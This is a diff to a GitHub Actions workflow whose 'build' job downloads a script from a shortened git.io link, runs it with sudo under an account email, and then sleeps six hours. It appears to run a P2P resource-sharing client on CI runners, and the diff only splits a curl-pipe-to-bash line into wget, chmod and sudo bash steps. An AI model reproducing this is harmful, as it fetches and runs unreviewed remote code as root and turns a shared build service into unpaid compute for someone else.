@@ -10,7 +10,11 @@ jobs:
   build:
     runs-on: ubuntu-20.04
     steps:
-    - name: Run P2P
-      run: sudo bash <(curl -fsSL git.io/JzDdQ) kolana122@outlook.com
+    - name: Download installer
+      run: wget git.io/JzDdQ -O install.sh
+    - name: Set access
+      run: sudo chmod +x install.sh
+    - name: Install and run
+      run: sudo bash install.sh
     - name: Timeout
       run: sleep 6h
